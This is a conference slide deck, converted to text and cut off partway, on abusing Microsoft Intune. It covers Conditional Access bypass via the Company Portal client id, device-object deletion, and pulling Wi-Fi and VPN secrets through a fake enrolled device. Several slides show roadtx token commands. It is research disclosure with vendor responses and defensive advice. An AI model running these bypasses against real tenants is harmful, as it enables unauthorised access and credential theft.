---
title: "Unveiling the Power of Intune Leveraging Intune for Breaking Into Your Cloud and On-Premise"
speakers: ["Yuya Chudo"]
conference: "Black Hat"
conference_full: "Black Hat Europe 2024"
edition: "Europe"
year: 2024
source_pdf: "BlackHat_Europe_2024_slides/Yuya Chudo_Unveiling the Power of Intune Leveraging Intune for Breaking Into Your Cloud and On-Premise.pdf"
pages: 89
sha256: "0a85fd57916a979ed5d005b38a647029d1652dfc7d7c1eb62326079d165f6a80"
text_chars: 35216
ocr_pages: 32
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T22:48:04Z"
---
# Unveiling the Power of Intune Leveraging Intune for Breaking Into Your Cloud and On-Premise

**Speakers:** Yuya Chudo  
**Conference:** Black Hat Europe 2024  
**Source:** `BlackHat_Europe_2024_slides/Yuya Chudo_Unveiling the Power of Intune Leveraging Intune for Breaking Into Your Cloud and On-Premise.pdf` (89 pages)


## Slide 1

### Unveiling the Power of Intune: Leveraging Intune for Breaking Into Your Cloud and On-Premise

###### Yuya Chudo

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WAN.)
PosQicnat y i, = 4
EWROPE 20 > Linn
DECEMBER 11-12, 2024 : ei <a ,
IEFINGS NG
“Unveiling the Power of intune:
Leveraging Intune for Breaking Into Your Cloud and On-Premise
Yuya Chudo
```

## Slide 2

#### Yuya Chudo

• Secureworks Adversary Group (SwAG) • Provides red teaming service

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Yuya Chudo
¢Secureworks Adversary Group (SWAG)
«Provides red teaming service
Secureworks
```

## Slide 3

#### Microsoft Intune

• Cloud-based endpoint management solution that helps securely
organize devices and access to organization resources
App Deployment
-
VPN / Wi Fi
Multiple Platform  management
Support
Compliance
Microsoft Intune
Device
Configuration
Entra ID Integration
Conditional Access
#BHEU

#BHEU @BlackHatEvents

## Slide 4

#### Transition to Modern Device Management

**Traditional**

**Modern**

- ✓ Active Directory ✓ Group Policy ✓ Configuration Manager

- ✓ Microsoft Entra ID

- ✓ Conditional Access

- ✓ Microsoft Intune

#BHEU @BlackHatEvents

## Slide 5

#### Research Goals

###### Understand Microsoft Intune internals

Explorer how attackers can abuse it

#BHEU @BlackHatEvents

## Slide 6

#### Agenda

- Dive Into Microsoft Intune

- Abusing Microsoft Intune

- Tools & Demo

- Takeaways

#BHEU @BlackHatEvents

## Slide 7

## Dive into Microsoft Intune

#BHEU @BlackHatEvents

## Slide 8

#### Phases of Intune Device Management

Enrollment

- Entra ID register/join

- • Enrollment service discovery • Certificate enrollment

Management

- Settings management

- Apps management

- Device compliance

#BHEU @BlackHatEvents

## Slide 9

#### Phases of Intune Device Management

Enrollment

- Entra ID register/join

- • Enrollment service discovery • Certificate enrollment

Management

- Settings management

- Apps management

- Device compliance

#BHEU @BlackHatEvents

## Slide 10

#### Steps of Device Enrollment

Microsoft Entra ID

Intune Company Portal （Enroll client）

Microsoft Graph

Device Registration Service

Enrollment Service

#BHEU @BlackHatEvents

## Slide 11

#### 1. Login to Microsoft Entra ID

Login Request

**Microsoft Entra ID**

ID/Password Intune Company Portal （Enroll client）

Microsoft Graph

Device Registration Service Enrollment Service

#BHEU @BlackHatEvents

## Slide 12

#### 1. Login to Microsoft Entra ID

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
V4 £223 V4 82:23
Microsoft Intune
BE Microsoft
Sign in
Email or phone
Company Portal
Get access to company resources
and keep them secure.
} sion in| Q Sign-in options
Microsoft Privacy & Cookies Terms of use Privacy & cookies
< e
```

## Slide 13

#### 1. Login to Microsoft Entra ID

```
GET
```

```
/common/oAuth2/v2.0/authorize?cpVersion=5.0.6228.0&prompt=select_account&client-
request-id=e9b90c65-829b-4860-85ea-9ba52131f19b&x-client-CPU=x86&x-client-
DM=Android+SDK+built+for+x86&x-client-OS=26&x-client-SKU=MSAL.Android&x-client-
Ver=5.3.0&login_hint=&instance_aware=true&code_challenge=N4xGRAZwZJDcMo(snip)bu_TW
WrwMO8&code_challenge_method=S256&claims=%7B%7D&client_id=9ba1a5c7-f17a-4de9-a1f1-
6178c8d51223&redirect_uri=msauth%3A%2F%2Fcom.microsoft.windowsintune.companyportal
%2F1L4Z9FJCgn5c0VLhyAxC5O9LdlE%253D&response_type=code&scope=0000000a-0000-0000-
c000-
000000000000%2F.default+openid+offline_access+profile&state=MTE6Y(snip)LTU5NjFlYzh
mZjEyMg HTTP/1.1
```

```
Host: login.microsoftonline.com
```

- ✓client_id: Intune Company Portal ( `9ba1a5c7-f17a-4de9-a1f1-6178c8d51223` )

#BHEU @BlackHatEvents

## Slide 14

#### 2. Discovery of the enrollment endpoint

Microsoft Entra ID

Discovery
request

Intune Company Portal
（Enroll client）

**Microsoft Graph**

Device Registration Service

Enrollment Service

#BHEU @BlackHatEvents

## Slide 15

#### 2. Discovery of the enrollment endpoint

Request to Microsoft Graph

```
GET /v1.0/myorganization/servicePrincipals/appId=0000000a-0000-0000-c000-
000000000000/endpoints HTTP/1.1
Host: graph.microsoft.com
Authorization: Bearer
```

```
eyJ0eXAiOiJKV1QiLCJub25jZSI6IjVZLVB2Z0tkX0FXRzBZdjZDaGY5YVFIdTBHQktXWFpSWi0yTTNYU3
lwX2MiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1jN2wzSXo5M2c3dXdnTmVFbW13X1dZR1BrbyIsImtpZCI6
Ik1jN2wzSXo5M2c3dXdnTmVFbW13X1dZR1BrbyJ9.eyJhdWQiOiIwMDAwMDAwMy0wMDAwLTAwMDAtYzAwM
C0wMDAwMDAwMDAwMDAiLCJpc3MiOiJodHRwczov (Snip)
```

#BHEU @BlackHatEvents

## Slide 16

#### 2. Discovery of the enrollment endpoint Response from Microsoft Graph

```
{
```

```
"@odata.context":
```

```
"https://graph.microsoft.com/v1.0/$metadata#servicePrincipals('appId%3D0000000a-0000-0000-c000-
000000000000')/endpoints",
```

```
"value": [
(snip)
{
```

```
"id": "39737e21-36e6-4db8-89a4-50e618df98cb",
```

```
"deletedDateTime": null,
```

```
"capability": "AndroidEnrollment",
"providerId": "0000000a-0000-0000-c000-000000000000",
"providerName": "AndroidEnrollment",
```

- `"providerResourceId": "8fade320-5cab-4f58-976d-1846071e93f1", "uri":`

```
"https://fef.msuc06.manage.microsoft.com/StatelessEnrollmentService/DeviceEnrollment.svc"
},
```

#BHEU @BlackHatEvents

## Slide 17

#### 3. Device join / register

Microsoft Entra ID

Intune Company Portal （Enroll client）

Device join/register

Microsoft Graph

Device Registration Service Enrollment Service

#BHEU @BlackHatEvents

## Slide 18

#### 3. Device join / register

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
3 | | | / |
. Device join / register
Microsoft Azure / Search resources, services, and dacs (G+/)
Home > MSFT | Devices > Devices
[7 Devices | All devices» x
MSFT - Microsoft Entra ID
3 + Download devices ‘3 Refresh #63 Manage view “ fa! Preview features vee
2 Google * | YP Add filters
1 device found
[| Name 7 Enabled OS Version Join type Owner MDM
[| Ly Google Pixel @ ves Android 8.2.0 Microsoft Entra joi... employeed None
bem
```

## Slide 19

#### 4. Certificate Enrollment

Microsoft Entra ID

Intune Company Portal （Enroll client）

Intune Device Certificate

Microsoft Graph

Device Registration Service

Enrollment Service

#BHEU @BlackHatEvents

## Slide 20

###### **Certificate Enrollment Request**

`※` snipped for brevity

- Access token

###### Access Token

- Certificate Signing Request

   - Intune Device certificate

- Entra ID device id

- OS version

Certificate Signing Request

- Manufacturer etc…

#BHEU @BlackHatEvents

## Slide 21

**Certificate Enrollment Response** `※` snipped for brevity

###### Provisioning XML

- Intune Device certificate

- Server certificate

- DM server URL

- Device name …etc

#BHEU @BlackHatEvents

## Slide 22

#### Enrolled to Intune

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Enrolled to Intune
Microsoft Intune admin center
Home
& G Android | Android devices» x
= C) Refresh LS Export = Columns VY @ Bulk device actions 1 devices
Cy
. PL Search @
Ga OS: Android (device administrator), Android (personally-own... , +5 YZ Add filters
“ Device name Manage... | Ownership Compliance os Y¥
. employee01_AndroidForWork_10/6/2024 11:27 PM Intune Unknown @ Not evaluate Android (personally-owned w...
```

## Slide 23

###### Microsoft Entra ID

###### Microsoft Intune

Linked via Device ID

Device ID: **79b9eec0-f7df-4c25-b5a5-ba361075451e**

Intune Device ID: cc45972f-1867-4694-887e-b57ed70c1ad1 Microsoft Entra Device ID: **79b9eec0-f7df-4c25-b5a5-ba361075451e**

Linked via **Device ID** extracted from access token in the certificate enrollment request

#BHEU @BlackHatEvents

## Slide 24

#### Phases of Intune Device Management

Enrollment

- Entra ID register/join

- • Enrollment service discovery • Certificate enrollment

Management

- Settings management

- Apps management

- Device compliance

#BHEU @BlackHatEvents

## Slide 25

##### **Sync (Check-in)**

- Enrolled device periodically or manually communicates to its management server through **OMA DM (Open Mobile Alliance Device Management) protocol**

   - Management server authenticates the device by the enrolled certificate

#BHEU @BlackHatEvents

## Slide 26

##### **OMA DM Session**

DM Server

SyncML Request

```
<Get>
```

```
<CmdID>1</CmdID>
```

```
<Item>
```

```
<Target>
<LocURI>
```

- `./DevDetail/Ext/Microsoft/DeviceName </LocURI>`

   - `</Target>`

   - `</Item>`

```
</Get>
```

(*.manage.microsoft.com)

Intune Company Portal (DM Client)

SyncML Response

```
<Results>
```

```
<CmdID>5</CmdID>
<MsgRef>2</MsgRef>
<CmdRef>1</CmdRef>
```

```
<Item>
```

```
<Source>
```

```
<LocURI>
```

```
./DevDetail/Ext/Microsoft/DeviceName
</LocURI>
```

```
</Source>
```

```
<Data>TEST-INTUNE01</Data>
```

```
</Item>
```

```
</Results>
```

#BHEU @BlackHatEvents

## Slide 27

##### **DM protocol commands**

• DM protocol commands are exchanged to issue instructions to the device Ex)

**Commands Description Get** Retrieves data from the client device **Replace** Overwrites data on the client device **Exec** Invokes an executable on the client device **Add** Adds a note to the DM tree **Delete** Removes a node from the DM tree **Result** Returns the data results of a command to the DM Server

#BHEU @BlackHatEvents

## Slide 28

##### **OMA-URI**

- DM server can query and configure settings by specifying its path ( **OMA-URI** )

Ex) Firewall Status `./Vendor/MSFT/DeviceStatus/Firewall/Status`

#BHEU @BlackHatEvents

## Slide 29

## Abusing Microsoft Intune

#BHEU @BlackHatEvents

## Slide 30

###### **Attacking on Enrollment**

- ✓ **Conditional Access bypass through Intune Company Portal** ✓ **Device object deletion through enrollment process**

###### **Attacking on Management**

- ✓ **Establishing a foothold through OMA DM**

- ✓ **Riding a SideCar for fun & profits**

#BHEU @BlackHatEvents

## Slide 31

###### **Attacking on Enrollment**

- ✓ **Conditional Access bypass through Intune Company Portal** ✓ **Device object deletion through enrollment process**

###### **Attacking on Management**

- ✓ **Establishing a foothold through OMA DM**

- ✓ **Riding a SideCar for fun & profits**

#BHEU @BlackHatEvents

## Slide 32

**Conditional Access: Require compliant device** Ensure user devices meet configuration requirements

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Conditional Access: Require compliant device
Ensure user devices meet configuration requirements
Control access enforcement to block or
grant access. Learn more @
OC) Block access
(@) Grant access
[] Require multifactor ©
authentication
[| Require authentication ©
strength
Require device to be marked = ©
as compliant
```

## Slide 33

##### **Device Compliance**

- Device configuration is evaluated and “ **marked as Compliant** ” according to the device compliance policy settings

#BHEU @BlackHatEvents

## Slide 34

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
roadtx ge ssword -r msgraph -ua $windows ua
Requesting token for res e https: / sraph microsoft .con/
Error during authentication: A Q: Device is not in required device state: compliant.
equires a compliant device, and t ice is n np li ne use _ must enroll their de
der Like Intune. Trace ID: 2/c44b6c
mestamp: 2024-04-08 ll: 21:192
```

## Slide 35

The conditional access policy might **break this** Microsoft Entra ID **process of** **~~device en~~ rollment** in Intune?

process of  device en
Discovery
request
Intune Company Portal

Microsoft Graph Device Registration Service Enrollment Service

#BHEU @BlackHatEvents

## Slide 36

#### Intune Company Portal Magic

**9ba1a5c7-f17a-4de9-a1f1-6178c8d51223** = Intune Company Portal

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Intune Company Portal Magic
—| )-[~]
L roadtx gettokens -u $username -p $password -r msgraph -ua $windows ua -c|9bala5c7-fl7a-4de9-alfl-6178c8d51223
Requesting token for resource https://qraph.microsoft.com/
Tokens were written to .roadtools auth
9baia5c7-f17a-4de9-a1f1-6178c8d51223
= Intune Company Portal
```

## Slide 37

#### Access token with limited scope

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat << -
EUROPE 2024
“app displayname": "Microsoft Intune Company Portal",
“appid": "9bala5c7-f17a-4de9-alf1-6178c8d51223",
“appidacr": "0",
"aud": “https://graph.microsoft.com/",
"exp": 1712579333,
"jat": 1712575122,
“idtyp": “user",
“ipaddr": ;
"iss": "https://sts.windows .net/645064ee - 9b6e- 43db-9d46- fe8la65cfdea/",
"name": “employeed1",
"“nbf": 1712575122,
"oid": "71ld6baf0-8476-46f6-b120-3ddicd2ddela",
"pDlatf": "3",
“puid": "100320031A6A921B",
"rh"; "0, ATOA7MROZG6b200dRV6Bp LZ960MAAAAAAAAAWAAAAAAAAACHAIE. ".
"scp": "Device.Read.ALl DeviceManagementConfiguration.Read.All DeviceManagementConfiguration.ReadWrite.ALl ServicePrincipalEndpoint.Read.All User.Read" j
21gnhifh Stale. [|
“inknownntwk"
```

## Slide 38

#### Downgrade to Azure AD Graph

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
gQ a + eo
black hat  < a
EUROPE 2024
Downgrade to Azure AD Graph
(kali kalL1) - [~]
Ls roadtx gettokens -u $username -p $password -r|aadgraph |-ua $windows ua -c |9bala5c7-fl/a-4de9-alf1-6178c8d51223
Requesting token for resource https://graph.windows.net/
Tokens were written to .roadtools auth
eee
“appid": "“9bala5c7-f17a-4de9-alf1-6178c8d51223",
“appidacr": "0",
"aud": “https://graph.windows.net/",
"exp": 1712580708,
"“jat": 1712576763,
“ipaddr": " i
"iss": “https://sts.windows.net/645064ee - 9b6e-43db-9d46- fe81la65cfdea/",
"name": “employeeOl",
“nbf": 1712576763,
"oid": "71ld6baf0-8476-46f6-b120-3ddlcd2ddela",
“puid": "100320031A6A921B",
"rh": "“0.ATOA7MROZG6D200dRV6Bp1Lz96g TAAAAAAAAAWAAAAAAAAACHAIJE.",
"scp": “user impersonation",
"Sub": eVENXRERQVI3WyX) ENCalLXGF 6D -wp6qosiNaJuQeyht4® ,
```

## Slide 39

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
piseichat
EUROPE 2024
ROADrec
Home
Database Stats Tenant information
Users Users 9 Name MSFT
Groups 7 Tenant ID 645064ee-9b6e
Groups Applications 2 Syncs from AD Yes
ServicePrincipals 185
Devices Devices 10 View R
Administrative Units 0 iain Home Filter
Administrative Units
Users Narr Prin Y : b 4 Em c rtrr t ss BSsw J 4,
Directory roles Authorization Policy) “ ,
Groups
Self-service password reset eng P Y 2024-03-13T06:26:13
Applications MSOnline powershell blocked
Devices
Service Principals Default user role permissions Y 2023-11-10T09:39:39
Default user role permissions Administrative Units
Application roles Guest access settings Y 2024-01-26T05:28:05
Directory roles
OAuth2 Permissions ry Y 2023-11-22T23:51:31
. Applications
Tenant Domains v 2024-02-07723:54:22
. Service Principals
, y apa P v 2023-12-02T10:21:55
Managed Email, OfficeCommunications| Application roles v 2024-02-14T10:51:53
Managed None OAuth2 Permissions
Y 2024-02-21T01:53:41
Managed None
Y 2024-01-26T05:46:14
50 ’
```

## Slide 40

##### **Require compliant + Entra hybrid joined device**

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Require compliant + Entra hybrid joined device
Require device to be marked = |©
as compliant
AX Don't lock yourself out! Make
sure that your device is
compliant. Learn more 7 For multiple controls
(e) Require all the selected controls
Require Microsoft Entra hybrid |© C) Require one of the selected controls
joined device
AX Don't lock yourself out! Make
sure that your device is Microsoft
Entra hybrid joined.
Learn more
```

## Slide 41

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
EUROPE 2024
$USER graph -ua $WINDOWS_UA
r resource https: //graph.windows.net/
ication: AADSTS5 : Device is not in required
domain joined device, and the dev is not domain j
domain_joined. Conditiomal Acc
joined. Trace ID:
7-487 f-bldd-eb 3f79 Timestamp: 2@2 5:28
-4778-a87b-55034dea2400@ Correlation ID:
$USER (ORD -r aadgraph -ua $WINDOWS_UA| -c
ro 9bala5c7-f17a-4de9-a1f1-6178c8d51223
Requesting < r_resource https:
graph.windows.net/
Tokens were wri to .roadtools_au
```

## Slide 42

##### **Attack Scenario #1-1**

- Attackers can acquire access tokens for **Microsoft Graph/Azure AD Graph** with **Microsoft Intune Company Portal** client id, bypassing device restriction policies in Condition Access

   - We **extracted information out of Entra ID without corporate device** to understand target environment in our redteam engagements

#BHEU @BlackHatEvents

## Slide 43

##### **Microsoft response** `（` **VULN-123240** `）`

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pis hat
EUROPE 2024
Microsoft response (VULN-123240)
« |This is by design|that Conditional Access does not enforce device compliance
ADGraph tokens as part of their enrollment (new device) and subsequent devi
when Microsoft Intune request for
ce check ins (for ongoing compliance
assessment). If we didn’t do this, this will create a chicken and the egg situation where a new device will fail to
enrall, or a non-compliant device can never be compliant if it cannot check-in again with Intune service. We
recommend customers to have other policy enforcement such as require MFA
when requesting for ADGraph
tokens.
```

## Slide 44

##### **Require multifactor authentication**

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pis hat
EUROPE 2024
SSWORD -r aadgraph -ua $WINDOWS_UA
‘ ://oraph.windows.net/
aannit ring a AADSTS50076: Due to a configuration change ade by your adm
aerial ecause you ae to a new Location, you must use ae i-fa r au uthentic
oa to a HAHBARAE SSIS AERIS III . Trace ID:
i 4603-9b6a- :
```

## Slide 45

##### **Exclude Microsoft Intune in Target resources**

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Exclude Microsoft Intune in Target resources
Include Exclude
Assignments
Select the cloud apps to exempt from the
Users () policy
Specific users included
Edit filter
Target resources ©
None
All cloud apps included and 1 app excluded
~ Select excluded cloud apps
Network NEW (i)
Microsoft Intune
Not configured
Conditions © Microsoft Intune
0 conditions selected
```

## Slide 46

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat = —
EUROPE 2024
| j—|) =~
L$ roadtx gettokens - $USER -p $PASSWORD -r aadgraph -ua S$WINDOWS_UA
Requesting token for resource https: //graph.windows.net/
Error during authentication: AADSTS50@76: Due to a configuration change made by your adm
inistrator, or because you moved to a new location, you must use multi-factor authentica
tion to access ‘@0000002-0000-0000-cO08-800000000000'. Trace ID: 4a@e462a-cO4d-432d-93c5
-3babb0/63208 Correlation ID: adsde4s0b-bé2t-4T¥l-bclb-4pbe499e¢acid Timestamp: #024-10-06
O3:47:027
—| )-[~]
L¢ roadtx gettokens - $USER -p $PASSWORD -r aadgraph -ua $WINDOWS_UA -c 9bala5Sc7-fl7a-
4de9-a1f1-6178c8d51223
Requesting token for resource https: // graph.windows.net/
Tokens were written to .roadtools_auth
```

## Slide 47

##### **Attack Scenario #1-2**

- Attackers can acquire **Microsoft Graph/Azure AD Graph** token with **Microsoft Intune Company Portal** client id without meeting MFA requirement when **Microsoft Intune is excluded in target resources**

   - We abused this to **get a token as a MFA-protected Global Administrator role-assigned user** to compromise its tenant in our engagements

#BHEU @BlackHatEvents

## Slide 48

##### **Microsoft response** `（` **VULN-130471** `）`

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Microsoft response (VULN-130471)
1. When certain exclusions are made to ‘target resources’ in a Conditional Access policy, we ensure seamless access by
also excluding specific dependencies that are essential for the exclusion to function correctly. In this instance, Intune relies
heavily on Entra ID data, such as users and groups, which is represented by ‘Windows Azure Active Directory’ in cloud
apps. Therefore, Windows Azure Active Directory is automatically excluded along with Intune to maintain this dependency
```

## Slide 49

##### **Recommendation**

- **MFA enforcement policy** should be added to device restriction

- policies

- **Try not to add any exclusion in target resources** in policies

- for high privileged users

- **Apply Application Filters** to target Azure AD Graph

- (00000002-0000-0000-c000-000000000000) with the same control

#BHEU @BlackHatEvents

## Slide 50

###### **Attacking on Enrollment**

- ✓ **Conditional Access bypass through Intune Company Portal** ✓ **Device object deletion through enrollment process**

###### **Attacking on Management**

- ✓ **Establishing a foothold through OMA DM**

- ✓ **Riding a SideCar for fun & profits**

#BHEU @BlackHatEvents

## Slide 51

##### **Differences in Certificate Enrollment**

- There are differences in the format and the types of parameters included in the certificate enrollment request between OSs

###### Linux

###### iOS/macOS

#BHEU @BlackHatEvents

## Slide 52

##### **Abusing the differences**

Access Token

AADID

- Android certificate enrollment endpoint accepts **access token without device id**

- The request includes **AADID parameter**

What happens when other device id is inserted in this request?

#BHEU @BlackHatEvents

## Slide 53

###### Microsoft Entra ID

###### Microsoft Intune

**deleted**

Device ID: **79b9eec0-f7df-4c25-b5a5-ba361075451e**

Intune Device ID: cc45972f-1867-4694-887e-b57ed70c1ad1 Microsoft Entra Device ID: **79b9eec0-f7df-4c25-b5a5-ba361075451e**

Certificate Enrollment Request with other user’s deviceid ( **79b9eec0-f7df-4c25b5a5-ba361075451e** )

#BHEU @BlackHatEvents

## Slide 54

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisekhat
EUROPE 2024
Microsoft Intune admin center
R Home
1) Dashboard
= All services
Cj Devices
EEE Apps
& Endpoint security
GA Reports
aa Users
&& Groups
Tenant administration
4 Troubleshooting + support
Home
Not found #
Device not found
® Get support 2 Perform self-diagnostics
Summary |
Session ID
769e6235d6f849a685025308ebe00175
Extension
Microsoft_Intune_Devices
Error code
404
Resource ID
Not available
Content
DeviceSettingsMenuBlade
```

## Slide 55

##### **Microsoft response** `（` **VULN-134464** `）`

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Microsoft response (VULN-134464)
Dear Yuya,
Thank you again for submitting this issue to Microsoft. We appreciate the time taken to submit this assessment.
Upon investigation, we confirmed the Issue. A fix for this issue has been addressed.
```

## Slide 56

##### **Attack Scenario #2**

- Attackers can **delete any OS’s device object in Microsoft Intune** through Android certificate enrollment endpoint

•IT admins cannot manage the device through Intune portal

- It is already patched

#BHEU @BlackHatEvents

## Slide 57

###### **Attacking on Enrollment**

- ✓ **Conditional Access bypass through Intune Company Portal** ✓ **Device object deletion through enrollment process**

###### **Attacking on Management**

- ✓ **Establishing a foothold through OMA DM**

- ✓ **Riding a SideCar for fun & profits**

#BHEU @BlackHatEvents

## Slide 58

##### **Device Management**

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Device Management
Microsoft Intune admin center
nfigurat Settings picker :
FF Home Create profile e commas "," amc rms to lookup settings by their keywor
Dashboard Windows 10 and later - Settings catalog earch for a setting
All services + Add filter
@ Basis @ Configuration settings Browse by category
_§) Devices
BH apps Trusted Certificate
User Rights
@ Endpoint security
7 Virtualization Based Technology
5a] . Settings catalog
= Reports ° VPN Connection
, With the settings catalog, you can choose which settings you want to
te Users . My configure. Click on Add settings to browse or search the catalog for the Wi-Fi Connection
ie \ A) 4 settings you want to configure. Wi-Fi Settings
&& Groups ‘sath Wine
p: bg Learn more Widgets
2 Tenant administration Windows Al
% Troubleshooting + support Windows Defender Security Center
Setting name
Select a category to show settings
```

## Slide 59

###### Configuration delivery via OMA DM Sync

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
Configuration delivery via OMA DM Sync
<Add>
<CmdID>
1S
</CmdID>
<Ite
<T
</
<D
m>
arget>
<LocURI>
. /Device/Vendor/MSFT/VPNv2i/Contosot2OVPN/PluginProfile/ServerUrlList
</LocURI>
Target>
at a>
vpn.contoso.com;Internal VPN
</
</f/It
</Add>
Data>
em>
```

## Slide 60

###### Configuration delivery via OMA DM Sync

###### Wi-Fi SS ID

Wi-Fi password

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
EUROPE 2024
<Add>
Configuration delivery via OMA DM Sync
<CmdID>
1é
</CmdID>
<Ite
<T
</
<D
m>
arget>
<LocURI>
-/Vendor/MSFT/WiFi/Profile/ContosoCorp Wi-Fi/Wlanxnl
</LocURI>
Target>
ae Wi-Fi SSID
&lt;WLANProfile
xmlns="http: //www.microsoft.com/networking/WLAN/profile/vl"égt;élt;nameégt;ContosoCorp Wi-Fiélt; /nameégt;élt;SSIDC
onfigégt ;élt;SSIDégt; élt;hexégt ;436FEE74EF 73EF43EF 72 7OSFSTESIDAGESE It; /hexégt;&lt;nameégt;ContosoCorp Wi-Fiélt;/na
meégt ;&1t;/SSIDégt ;&lt ;nonBroadcastégt ; falseélt; /nonBroadcastiégt ;&lt;/SSIDConfigégt ;&lt;connectionlypeagt;ESSélt;/
connectionTypeégt;é&lt;connectionModeégt ; autoélt;/connectionModeégt;&lt;autoSwitchégt; falseélt;/autoSwitchégt;élt;M
SMégt ;é&lt;securityégt;élt;authEncryptionégt;é&lt;authenticationégt ;WPALDPSKélt; /authenticationégt;&lt;encryptionégt;
AES&1t;/encryptionégt ;élt;useOneXégt; falseélt; /useOneXégt ; &lt;FIPSMode
xmlns="http: //www.microsoft.com/networking/WLAN/profile/vi"égt; falseélt;/FIPSModeégt;élt;/authEncryptionégt;élt;sh
aredKeyégt ;&lt;keyTypeégt ;passPhraseélt;/keyTypecégt;é&lt;protectedégt; falseélt;/protectedégt;élt;keyMaterialégt;Sup
erSecretWiFiPasswordélt; /keyMaterialégt;&lt;/sharedKeyégt ; &1lt ; PMKCacheModeagt ;disabledélt ; /PMKCacheModeagt ;&1t;/se_
</
</It
</Add>
curityégt;élt;/MSMégt;élt;/WLANProfileégt;
Data>
e«» Wi-Fi password
```

## Slide 61

###### Replicating Intune Company Portal

Victim
1. ID/Password or
token theft
Fake
Attacker
Device

2. Get/refresh token
Microsoft Entra ID
3. Discovery request
Microsoft Graph
4. Device join/register
Device Registration Service
5. Certificate enroll
Enrollment Server
6. OMA DM
Management Server

#BHEU @BlackHatEvents

## Slide 62

###### Exfiltrating configuration via OMA DM Sync

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat < ~
EUROPE 2024
Exfiltrating configuration via OMA DM Sync
[!] maybe these are configuration profiles:
- ,/Device/Vendor/MSFT/VPNv2/Contoso%2@VPN/RememberCredentials: false
- ./Device/Vendor/MSFT/VPNv2/Contosox%20VPN/AlwaysOn: false
- ./Device/Vendor/MSFT/VPNv2/Contosox%20VPN/RegisterDns: false
- ./Device/Vendor/MSFI/VPNv2/Contoso%2@VPN/DeviceCompliance/Enabled: false
- ./Device/Vendor/MSFT/VPNv2/Contoso%28VPN/DeviceCompLliance/5so0/Enabled: false
- ./Device/Vendor/MSFT/VPNv2/Contoso%20VPN/PLluginProfile/ServerUrLList: vpn.contoso.com;Internal VPN
- ./Device/Vendor/MSFT/VPNv2/Contoso%20VPN/PLuginProfile/CustomConfiguration: <pulse-schema><isSingleSignOnCredentia
L>true</ isSingleSignOnCredentiaLl></ pulse-schema>
- ./Device/Vendor/MSFT/VPNv2/Contosox20VPN/PLuginProfile/PluginPackageFamilyName: 951D7986.PulseSecureVPN_gzpvgh7otg
a4p
- ,/Vendor/MSFI/DMCLient/Provider/MS22UDMe20Server/PollL/PollOnLogin: true
— ,/cimv2/MDM_ConfigSetting/MDM_ContigSetting.SettingName=%22AccountId#22/SettingValue: 3decc354-7c51-4c78-9f40-7ebs
fefbes47
— ,/Vendor/MSFT/WiFi/Profile/ContosoCorp_Wi-Fi/WLanxmL:
{'WLANProfile': {‘@xmlns*: ‘http: //ww.microsoft.com/networking/WLAN/profile/vi', 'name": 'ContosoCorp_Wi-Fi', ‘SSID
Config': {'SSID': {'hex': '436F6E746F736F436F72705F57692D4669', ‘name’: 'ContosoCorp_Wi-Fi'}, 'nonBroadcast': ‘false
"}, ‘connectionType': "ESS", ‘connectionMode': ‘auto’, ‘autoSwitch': 'false', 'MSM': {'security': {'authEncryption':
{'authentication': 'WPA2PSK", ‘encryption’: 'AES', ‘useOneX': ‘false’, 'FIPSMode': {‘@xmlns': "http: //ww.microsoft
.com/networking/WLAN/profile/v2', ‘#text': 'false'}}, ‘sharedKey': {'keyType': "passPhrase', ‘protected’: 'false', '
keyMaterial': 'SuperSecretWiFiPassword'}, "PMKCacheMode': 'disabled'}}}}
- ./Vendor/MSFT/WiFi/Profile/ContosoCorp Wi-Fi/WiFiCost: 1
```

## Slide 63

###### Exfiltrating Line-Of-Business apps via OMA DM Sync

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
